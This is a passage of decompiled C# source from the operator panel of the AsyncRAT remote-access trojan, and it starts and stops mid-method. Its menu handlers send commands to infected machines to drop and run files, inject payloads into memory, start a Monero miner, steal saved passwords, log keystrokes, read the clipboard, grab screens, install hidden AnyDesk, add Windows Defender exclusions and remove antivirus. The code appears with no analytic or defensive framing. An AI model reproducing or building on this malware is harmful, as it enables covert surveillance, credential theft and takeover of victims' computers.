							msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
							Clients[] selectedClients = this.GetSelectedClients();
							for (int i = 0; i < selectedClients.Length; i++)
							{
								ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
							}
						}
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000109 RID: 265 RVA: 0x00010028 File Offset: 0x0000E228
		private void CloseToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "close";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Packet").AsString = "plugin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600010A RID: 266 RVA: 0x000100EC File Offset: 0x0000E2EC
		private void RestartToolStripMenuItem2_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "restart";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Packet").AsString = "plugin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600010B RID: 267 RVA: 0x000101B0 File Offset: 0x0000E3B0
		private void UpdateToolStripMenuItem2_Click(object sender, EventArgs e)
		{
			try
			{
				using (OpenFileDialog openFileDialog = new OpenFileDialog())
				{
					if (openFileDialog.ShowDialog() == DialogResult.OK)
					{
						MsgPack msgPack = new MsgPack();
						msgPack.ForcePathObject("Packet").AsString = "sendFile";
						msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
						msgPack.ForcePathObject("Extension").AsString = Path.GetExtension(openFileDialog.FileName);
						msgPack.ForcePathObject("Update").AsString = "true";
						MsgPack msgPack2 = new MsgPack();
						msgPack2.ForcePathObject("Packet").AsString = "plugin";
						msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
						msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
						foreach (Clients clients in this.GetSelectedClients())
						{
							clients.LV.ForeColor = Color.Red;
							ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
						}
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600010C RID: 268 RVA: 0x00010318 File Offset: 0x0000E518
		private void UninstallToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (MessageBox.Show(this, "Are you sure you want to unistall", "AsyncRAT | Unistall", MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) == DialogResult.Yes)
			{
				try
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "uninstall";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Packet").AsString = "plugin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = this.GetSelectedClients();
					for (int i = 0; i < selectedClients.Length; i++)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x0600010D RID: 269 RVA: 0x000103F4 File Offset: 0x0000E5F4
		private void RestartToolStripMenuItem3_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "pcOptions";
				msgPack.ForcePathObject("Option").AsString = "restart";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Packet").AsString = "plugin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600010E RID: 270 RVA: 0x000104CC File Offset: 0x0000E6CC
		private void ShutdownToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "pcOptions";
				msgPack.ForcePathObject("Option").AsString = "shutdown";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Packet").AsString = "plugin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600010F RID: 271 RVA: 0x000105A4 File Offset: 0x0000E7A4
		private void LogoffToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "pcOptions";
				msgPack.ForcePathObject("Option").AsString = "logoff";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Packet").AsString = "plugin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000110 RID: 272 RVA: 0x0001067C File Offset: 0x0000E87C
		private void bUILDERToolStripMenuItem_Click(object sender, EventArgs e)
		{
			using (FormBuilder formBuilder = new FormBuilder())
			{
				formBuilder.ShowDialog();
			}
		}

		// Token: 0x06000111 RID: 273 RVA: 0x000106B4 File Offset: 0x0000E8B4
		private void ABOUTToolStripMenuItem_Click(object sender, EventArgs e)
		{
			using (FormAbout formAbout = new FormAbout())
			{
				formAbout.ShowDialog();
			}
		}

		// Token: 0x06000112 RID: 274 RVA: 0x000106EC File Offset: 0x0000E8EC
		private void CLEARToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				object lockListviewLogs = Settings.LockListviewLogs;
				lock (lockListviewLogs)
				{
					this.listView2.Items.Clear();
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000113 RID: 275 RVA: 0x00010750 File Offset: 0x0000E950
		private void STARTToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.listView1.Items.Count > 0)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "thumbnails";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Packet").AsString = "plugin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] allClients = this.GetAllClients();
				for (int i = 0; i < allClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(allClients[i].Send), msgPack2.Encode2Bytes());
				}
			}
		}

		// Token: 0x06000114 RID: 276 RVA: 0x00010808 File Offset: 0x0000EA08
		private void STOPToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.Items.Count > 0)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "thumbnailsStop";
					foreach (object obj in this.listView3.Items)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(((Clients)((ListViewItem)obj).Tag).Send), msgPack.Encode2Bytes());
					}
				}
				this.listView3.Items.Clear();
				this.ThumbnailImageList.Images.Clear();
				foreach (object obj2 in this.listView1.Items)
				{
					((Clients)((ListViewItem)obj2).Tag).LV2 = null;
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000115 RID: 277 RVA: 0x00010938 File Offset: 0x0000EB38
		private void DELETETASKToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.listView4.SelectedItems.Count > 0)
			{
				foreach (object obj in this.listView4.SelectedItems)
				{
					((ListViewItem)obj).Remove();
				}
			}
		}

		// Token: 0x06000116 RID: 278 RVA: 0x000109A8 File Offset: 0x0000EBA8
		private void TimerTask_Tick(object sender, EventArgs e)
		{
			//Form1.<TimerTask_Tick>d__59 <TimerTask_Tick>d__;
			//<TimerTask_Tick>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			//<TimerTask_Tick>d__.<>4__this = this;
			//<TimerTask_Tick>d__.<>1__state = -1;
			//<TimerTask_Tick>d__.<>t__builder.Start<Form1.<TimerTask_Tick>d__59>(ref <TimerTask_Tick>d__);
		}

		// Token: 0x06000117 RID: 279 RVA: 0x000109E0 File Offset: 0x0000EBE0
		private void MinerToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView4.Items.Count > 0)
				{
					//using (IEnumerator enumerator = this.listView4.Items.GetEnumerator())
					//{
					//	while (enumerator.MoveNext())
					//	{
					//		if (((ListViewItem)enumerator.Current).Text == "Miner XMR")
					//		{
					//			return;
					//		}
					//	}
					//}
				}
				using (FormMiner formMiner = new FormMiner())
				{
					if (formMiner.ShowDialog() == DialogResult.OK)
					{
						File.Exists("Plugins\\xmrig.bin");
						MsgPack msgPack = new MsgPack();
						msgPack.ForcePathObject("Packet").AsString = "xmr";
						msgPack.ForcePathObject("Command").AsString = "run";
						XmrSettings.Pool = formMiner.txtPool.Text;
						msgPack.ForcePathObject("Pool").AsString = formMiner.txtPool.Text;
						XmrSettings.Wallet = formMiner.txtWallet.Text;
						msgPack.ForcePathObject("Wallet").AsString = formMiner.txtWallet.Text;
						XmrSettings.Pass = formMiner.txtPass.Text;
						msgPack.ForcePathObject("Pass").AsString = formMiner.txtPool.Text;
						XmrSettings.InjectTo = formMiner.comboInjection.Text;
						msgPack.ForcePathObject("InjectTo").AsString = formMiner.comboInjection.Text;
						XmrSettings.Hash = GetHash.GetChecksum("Plugins\\xmrig.bin");
						msgPack.ForcePathObject("Hash").AsString = XmrSettings.Hash;
						MsgPack msgPack2 = new MsgPack();
						msgPack2.ForcePathObject("Packet").AsString = "plugin";
						msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
						msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
						ListViewItem listViewItem = new ListViewItem();
						listViewItem.Text = "Miner XMR";
						listViewItem.SubItems.Add("0");
						listViewItem.ToolTipText = Guid.NewGuid().ToString();
						this.listView4.Items.Add(listViewItem);
						this.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
						this.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText));
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000118 RID: 280 RVA: 0x00010CA0 File Offset: 0x0000EEA0
		private void PASSWORDRECOVERYToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView4.Items.Count > 0)
				{
					//using (IEnumerator enumerator = this.listView4.Items.GetEnumerator())
					//{
					//	while (enumerator.MoveNext())
					//	{
					//		if (((ListViewItem)enumerator.Current).Text == "Recovery Password")
					//		{
					//			return;
					//		}
					//	}
					//}
				}
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "plugin";
				msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Recovery.dll");
				ListViewItem listViewItem = new ListViewItem();
				listViewItem.Text = "Recovery Password";
				listViewItem.SubItems.Add("0");
				listViewItem.ToolTipText = Guid.NewGuid().ToString();
				this.listView4.Items.Add(listViewItem);
				this.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
				this.getTasks.Add(new AsyncTask(msgPack.Encode2Bytes(), listViewItem.ToolTipText));
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000119 RID: 281 RVA: 0x00010E00 File Offset: 0x0000F000
		private void DownloadAndExecuteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				OpenFileDialog openFileDialog = new OpenFileDialog();
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "sendFile";
					msgPack.ForcePathObject("Update").AsString = "false";
					msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
					msgPack.ForcePathObject("Extension").AsString = Path.GetExtension(openFileDialog.FileName);
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Packet").AsString = "plugin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					ListViewItem listViewItem = new ListViewItem();
					listViewItem.Text = "SendFile: " + Path.GetFileName(openFileDialog.FileName);
					listViewItem.SubItems.Add("0");
					listViewItem.ToolTipText = Guid.NewGuid().ToString();
					if (this.listView4.Items.Count > 0)
					{
						//using (IEnumerator enumerator = this.listView4.Items.GetEnumerator())
						//{
						//	while (enumerator.MoveNext())
						//	{
						//		if (((ListViewItem)enumerator.Current).Text == listViewItem.Text)
						//		{
						//			return;
						//		}
						//	}
						//}
					}
					Program.form1.listView4.Items.Add(listViewItem);
					Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
					this.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText));
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600011A RID: 282 RVA: 0x00011010 File Offset: 0x0000F210
		private void SENDFILETOMEMORYToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				FormSendFileToMemory formSendFileToMemory = new FormSendFileToMemory();
				formSendFileToMemory.ShowDialog();
				if (formSendFileToMemory.toolStripStatusLabel1.Text.Length > 0 && formSendFileToMemory.toolStripStatusLabel1.ForeColor == Color.Green)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "sendMemory";
					msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(formSendFileToMemory.toolStripStatusLabel1.Tag.ToString())));
					if (formSendFileToMemory.comboBox1.SelectedIndex == 0)
					{
						msgPack.ForcePathObject("Inject").AsString = "";
					}
					else
					{
						msgPack.ForcePathObject("Inject").AsString = formSendFileToMemory.comboBox2.Text;
					}
					ListViewItem listViewItem = new ListViewItem();
					listViewItem.Text = "SendMemory: " + Path.GetFileName(formSendFileToMemory.toolStripStatusLabel1.Tag.ToString());
					listViewItem.SubItems.Add("0");
					listViewItem.ToolTipText = Guid.NewGuid().ToString();
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Packet").AsString = "plugin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					if (this.listView4.Items.Count > 0)
					{
						//using (IEnumerator enumerator = this.listView4.Items.GetEnumerator())
						//{
						//	while (enumerator.MoveNext())
						//	{
						//		if (((ListViewItem)enumerator.Current).Text == listViewItem.Text)
						//		{
						//			return;
						//		}
						//	}
						//}
					}
					Program.form1.listView4.Items.Add(listViewItem);
					Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
					this.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText));
				}
				formSendFileToMemory.Close();
				formSendFileToMemory.Dispose();
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600011B RID: 283 RVA: 0x00011278 File Offset: 0x0000F478
		private void UPDATEToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				OpenFileDialog openFileDialog = new OpenFileDialog();
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "sendFile";
					msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
					msgPack.ForcePathObject("Extension").AsString = Path.GetExtension(openFileDialog.FileName);
					msgPack.ForcePathObject("Update").AsString = "true";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Packet").AsString = "plugin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					ListViewItem listViewItem = new ListViewItem();
					listViewItem.Text = "Update: " + Path.GetFileName(openFileDialog.FileName);
					listViewItem.SubItems.Add("0");
					listViewItem.ToolTipText = Guid.NewGuid().ToString();
					if (this.listView4.Items.Count > 0)
					{
						//using (IEnumerator enumerator = this.listView4.Items.GetEnumerator())
						//{
						//	while (enumerator.MoveNext())
						//	{
						//		if (((ListViewItem)enumerator.Current).Text == listViewItem.Text)
						//		{
						//			return;
						//		}
						//	}
						//}
					}
					Program.form1.listView4.Items.Add(listViewItem);
					Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
					this.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText));
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600011C RID: 284 RVA: 0x00011488 File Offset: 0x0000F688
		//private bool GetListview(string id)
		//{
		//	//using (IEnumerator enumerator = Program.form1.listView4.Items.GetEnumerator())
		//	//{
		//	//	while (enumerator.MoveNext())
		//	//	{
		//	//		if (((ListViewItem)enumerator.Current).ToolTipText == id)
		//	//		{
		//	//			return true;
		//	//		}
		//	//	}
		//	//	return false;
		//	//}
		//	bool result;
		//	//return result;
		//}

		// Token: 0x0600011D RID: 285 RVA: 0x000114F8 File Offset: 0x0000F6F8
		private void SetExecution(string id)
		{
			foreach (object obj in Program.form1.listView4.Items)
			{
				ListViewItem listViewItem = (ListViewItem)obj;
				if (listViewItem.ToolTipText == id)
				{
					int num = Convert.ToInt32(listViewItem.SubItems[1].Text);
					num++;
					listViewItem.SubItems[1].Text = num.ToString();
				}
			}
		}

		// Token: 0x0600011E RID: 286 RVA: 0x00011598 File Offset: 0x0000F798
		private void BlockClientsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			using (FormBlockClients formBlockClients = new FormBlockClients())
			{
				formBlockClients.ShowDialog();
			}
		}

		// Token: 0x0600011F RID: 287
		[DllImport("uxtheme", CharSet = CharSet.Unicode)]
		public static extern int SetWindowTheme(IntPtr hWnd, string textSubAppName, string textSubIdList);

		// Token: 0x06000120 RID: 288 RVA: 0x000115D0 File Offset: 0x0000F7D0
		private void renameToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				string text = Interaction.InputBox("Name", "Rename", "", -1, -1);
				if (!string.IsNullOrEmpty(text))
				{
					string str = Environment.ExpandEnvironmentVariables("%appdata%\\AsyncRAT\\clients\\name") + "\\_";
					foreach (Clients clients in this.GetSelectedClients())
					{
						File.WriteAllText(str + clients.ID, text);
						clients.LV.SubItems[2].Text = text;
						Program.form1.listView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000121 RID: 289 RVA: 0x00011680 File Offset: 0x0000F880
		private void renameToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				string text = Interaction.InputBox("Name", "Rename", "", -1, -1);
				if (!string.IsNullOrEmpty(text))
				{
					string str = Environment.ExpandEnvironmentVariables("%appdata%\\AsyncRAT\\clients\\name") + "\\_";
					foreach (Clients clients in this.GetSelectedClients())
					{
						File.WriteAllText(str + clients.ID, text);
						clients.LV.SubItems[2].Text = text;
						Program.form1.listView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
						try
						{
							foreach (object obj in this.listView5.Items)
							{
								ListViewItem listViewItem = (ListViewItem)obj;
								if (listViewItem.SubItems[0].Text == clients.ID)
								{
									listViewItem.SubItems[1].Text = text;
								}
							}
							Program.form1.listView5.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
						}
						catch (Exception)
						{
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000122 RID: 290 RVA: 0x00011800 File Offset: 0x0000FA00
		private void restScaleToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "ResetScale";
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack.Encode2Bytes());
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000123 RID: 291 RVA: 0x0001186C File Offset: 0x0000FA6C
		private void wDToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "WDExclusion";
				msgPack.ForcePathObject("Dll").SetAsBytes(Zip.Compress(File.ReadAllBytes("Plugins\\WDExclusion.dll")));
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack.Encode2Bytes());
				}
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Packet").AsString = "sendMemory";
				msgPack2.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes("Plugins\\Form.exe")));
				msgPack2.ForcePathObject("Inject").AsString = "aspnet_compiler.exe";
				msgPack.ForcePathObject("Packet").AsString = "plugin";
				msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendMemory.dll");
				msgPack.ForcePathObject("Msgpack").SetAsBytes(msgPack2.Encode2Bytes());
				foreach (Clients clients in this.GetSelectedClients())
				{
					clients.LV.ForeColor = Color.Red;
					ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack.Encode2Bytes());
					new HandleLogs().Addmsg("Sending WDExclusion.dll..", Color.Black);
					this.tabControl1.SelectedIndex = 1;
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000124 RID: 292 RVA: 0x000119F8 File Offset: 0x0000FBF8
		private void setToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				string asString = Interaction.InputBox("Set Clipboard", "Text", "", -1, -1);
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "setxt";
				msgPack.ForcePathObject("code").AsString = asString;
				msgPack.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000125 RID: 293 RVA: 0x00011AAC File Offset: 0x0000FCAC
		private void getToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "gettxt";
				msgPack.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000126 RID: 294 RVA: 0x00011B38 File Offset: 0x0000FD38
		private void onkineToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "plugin";
				msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\LimeLogger.dll");
				foreach (Clients clients in this.GetSelectedClients())
				{
					if ((FormKeylogger)Application.OpenForms["keyLogger:" + clients.ID] == null)
					{
						new FormKeylogger
						{
							Name = "keyLogger:" + clients.ID,
							Text = "keyLogger:" + clients.ID,
							F = this,
							FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", clients.ID, "Keylogger")
						}.Show();
						ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000127 RID: 295 RVA: 0x00011C50 File Offset: 0x0000FE50
		private void getscreenToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "getscreen";
				msgPack.ForcePathObject("Dll").SetAsBytes(Zip.Compress(File.ReadAllBytes("Plugins\\Getscreen.dll")));
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack.Encode2Bytes());
				}
				new HandleLogs().Addmsg("Sending Getscreen.dll..", Color.Black);
				this.tabControl1.SelectedIndex = 1;
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000128 RID: 296 RVA: 0x00011D08 File Offset: 0x0000FF08
		private void net35InstallToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "Net35";
				msgPack.ForcePathObject("Dll").SetAsBytes(Zip.Compress(File.ReadAllBytes("Plugins\\Net35.dll")));
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack.Encode2Bytes());
				}
				new HandleLogs().Addmsg("Sending Net35.dll..", Color.Black);
				this.tabControl1.SelectedIndex = 1;
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000129 RID: 297 RVA: 0x00011DC0 File Offset: 0x0000FFC0
		private void hiddenAnydeskToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "anydesk";
				msgPack.ForcePathObject("Dll").SetAsBytes(Zip.Compress(File.ReadAllBytes("Plugins\\Hidden Anydesk.dll")));
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack.Encode2Bytes());
				}
				new HandleLogs().Addmsg("Sending Hidden Anydesk.dll..", Color.Black);
				this.tabControl1.SelectedIndex = 1;
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600012A RID: 298 RVA: 0x00011E78 File Offset: 0x00010078
		private void avastRemovalToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				using (AVR avr = new AVR())
				{
					if (avr.ShowDialog() == DialogResult.OK && this.listView1.SelectedItems.Count > 0)
					{
						MsgPack msgPack = new MsgPack();
						string text = "";
						foreach (object obj in avr.listBox1.Items)
						{
							text = text + ((obj != null) ? obj.ToString() : null) + "=>";
						}
						msgPack.ForcePathObject("Packet").AsString = "Avast";
						msgPack.ForcePathObject("Data").AsString = text;
						msgPack.ForcePathObject("Dll").SetAsBytes(Zip.Compress(File.ReadAllBytes("Plugins\\AVRemoval.dll")));
						foreach (Clients clients in this.GetSelectedClients())
						{
							clients.LV.ForeColor = Color.Red;
							ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack.Encode2Bytes());
						}
						new HandleLogs().Addmsg("Sending AVRemoval.dll..", Color.Black);
						this.tabControl1.SelectedIndex = 1;
					}
				}
			}
			catch (Exception ex)
			{
